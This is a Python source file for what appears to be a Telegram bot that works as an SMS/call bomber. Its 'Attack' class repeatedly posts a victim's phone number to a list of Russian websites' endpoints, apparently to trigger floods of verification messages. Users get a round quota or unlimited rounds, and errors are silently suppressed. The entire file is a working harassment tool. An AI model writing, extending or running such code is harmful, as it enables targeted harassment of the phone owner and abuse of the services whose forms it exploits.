from json import loads
from aiohttp import ClientSession
from asyncio import sleep
from asyncio.exceptions import TimeoutError

from objects import globals

from aiohttp.client_exceptions import (
        ClientConnectionError, ClientOSError)

from aiogram.types import Message
from datetime import datetime as dt

class Attack:
    phone:str
    user_id:int

    def __init__(self, phone="", user_id=None):
        """
        phone - Get user phone 
        client_session - ClientSession
        process_status - default True
        state_circles - default 0
        """
        self.phone:str = phone 
        self.user_id = user_id
        self.client_session:ClientSession = ClientSession()
        self.process_status = True 
        self.state_cirlces = 0 
        self.user_data = None
    
    async def start(self, message: Message):
        #Get all data sites or services
        self.user_data = await globals.UserData.objects.filter(user_id=self.user_id).all()
        circles_status = self.user_data[0].status

        if circles_status == "∞":
            self.state_circles = "∞"
        elif int(circles_status) == 0:
            await globals.bot.delete_message(
                chat_id = message.chat.id, 
                message_id = message.message_id+1
            )

            return await message.answer(
                text="Количество кругов израсходовано!"
            )
        
        else:
            self.state_circles:int = int(circles_status)

        with open(r"sites/RU.json") as sites_read:
            sites = loads(sites_read.read())

        while self.process_status:
            if self.state_circles == "∞":pass
            elif self.state_circles == 0:
                #Update count circles (auto stoping)
                await self.user_data[0].update(
                    status=str(self.state_circles), 
                    last_phone=self.phone, 
                    last_date=dt.now()
                    ) 

                return await message.answer(
                    text="Количество кругов израсходовано!"
                )

            for site in sites.values():
                try:
                    if "data" in site.keys():
                        #Type data
                        data_data = site["data"]
                        data_data[site["arg"]] = site["plus"]+self.phone
                        async with self.client_session.post(
                            url=site["url"], data=data_data, 
                            timeout=2) as resp:pass

                    elif "json" in site.keys():
                        #Type json
                        json_data = site["json"]
                        json_data[site["arg"]] = site["plus"]+self.phone
                        async with self.client_session.post(
                            url=site["url"], json=json_data, 
                            timeout=2) as resp:pass
                    
                    elif "params" in site.keys():
                        #Type params
                        params_data = site["params"]
                        params_data[site["arg"]] = site["plus"]+self.phone
                        async with self.client_session.post(
                            url=site["url"], json=params_data, 
                            timeout=2) as resp:pass
                    else:
                        #Type formating
                        url = site["url"].format(self.phone)
                        async with self.client_session.post(
                            url=url, timeout=2) as resp:pass

                except (ClientConnectionError, ClientOSError):pass
                except TimeoutError:pass
                except RuntimeError:pass
                except TypeError:pass
        
            await sleep(3) #Time-out
            if circles_status == "∞":pass
            else:self.state_circles-=1

    async def stop(self):
        #Update count cirlces (handle stoping)
        await self.user_data[0].update(
                status=str(self.state_circles), 
                last_phone=self.phone, 
                last_date=dt.now()
                )
        self.process_status = False         #Change process status 
        await self.client_session.close()   #Stop process attack
        